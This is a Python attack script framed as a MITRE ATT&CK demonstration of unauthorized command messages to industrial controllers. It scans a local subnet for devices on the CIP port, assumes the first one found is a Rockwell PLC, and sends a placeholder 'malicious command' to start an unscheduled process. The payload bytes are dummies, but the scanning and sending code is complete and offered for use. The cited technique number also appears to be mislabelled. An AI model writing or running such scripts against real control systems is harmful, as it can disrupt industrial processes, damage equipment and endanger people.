# MITRE ATT&CK Tactic: Impair Process Control (T1575)
# Technique: Unauthorized Command Message

import socket
import struct
import time
import subprocess

# Configuration
PLC_DEFAULT_PORT = 2222  # Example port, adjust to your PLC configuration
COMMAND_TO_SEND = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09'  # Replace with your malicious command
COMMAND_DESCRIPTION = "Start Unscheduled Process" #Replace with your command
COMMAND_IMPACT = "Potential damage to equipment or process disruption" # Replace with your command
COMMAND_JUSTIFICATION = "This script is for demonstration purposes only and to show the possible impacts of unauthorized commands." # Replace with your justification

def find_plc_ip():
    """
    Attempts to find the PLC's IP address by pinging the network and
    looking for responses with the vendor ID associated with Rockwell.
    This is a simplified approach and might not work in all environments.

    Returns:
        str: The IP address of the PLC if found, otherwise None.
    """
    try:
        # Replace '192.168.1' with your network's base address.  Adjust the range (1-254) as needed.
        for i in range(1, 255):  # Iterate through possible IP addresses
            ip_address = f'192.168.1.{i}'
            try:
                # Execute a ping command
                result = subprocess.run(['ping', '-n', '1', ip_address], capture_output=True, timeout=2, text=True)

                # Check if the ping was successful
                if result.returncode == 0:
                    # Attempt a TCP connection to port 44818 (Common Industrial Protocol)
                    # to check for Rockwell devices. This may need adjusting.
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1)
                        try:
                            s.connect((ip_address, 44818)) # CIP port
                            # If connection is successful, assume it is Rockwell
                            print(f"Found potential Rockwell device at {ip_address} on CIP Port.")
                            return ip_address
                        except (socket.timeout, ConnectionRefusedError):
                            pass
            except Exception as e:
                print(f"Error pinging {ip_address}: {e}")
                pass

    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None

    print("PLC IP address not found.")
    return None


def send_unauthorized_command(plc_ip, port, command):
    """
    Sends an unauthorized command to the PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
        port (int): The port number to connect to.
        command (bytes): The command to send.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)  # Timeout for connection and sending
            s.connect((plc_ip, port))
            print(f"Connected to PLC at {plc_ip}:{port}")

            s.sendall(command)
            print(f"Sent unauthorized command: {command.hex()}")

            # Optionally, receive a response from the PLC (handle potential errors)
            try:
                response = s.recv(1024)
                print(f"Received response: {response.hex()}")
            except socket.timeout:
                print("No response received from PLC within timeout.")
            except Exception as e:
                print(f"Error receiving response: {e}")

    except socket.error as e:
        print(f"Socket error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")


def main():
    plc_ip = find_plc_ip()

    if plc_ip:
        print(f"Found PLC IP: {plc_ip}")

        print("==================================================")
        print("MITRE ATT&CK: Impair Process Control (T1575)")
        print("Technique: Unauthorized Command Message")
        print("==================================================")
        print(f"Description: This script sends an unauthorized command to the PLC to {COMMAND_DESCRIPTION}")
        print(f"Impact: {COMMAND_IMPACT}")
        print(f"Justification: {COMMAND_JUSTIFICATION}")
        print("==================================================")
        print("WARNING: This script can cause DAMAGE and DISRUPTION. Use with EXTREME CAUTION in a controlled environment.")
        print("==================================================")

        input("Press Enter to send the unauthorized command...")
        send_unauthorized_command(plc_ip, PLC_DEFAULT_PORT, COMMAND_TO_SEND)
    else:
        print("Could not find PLC IP address. Exiting.")


if __name__ == "__main__":
    main()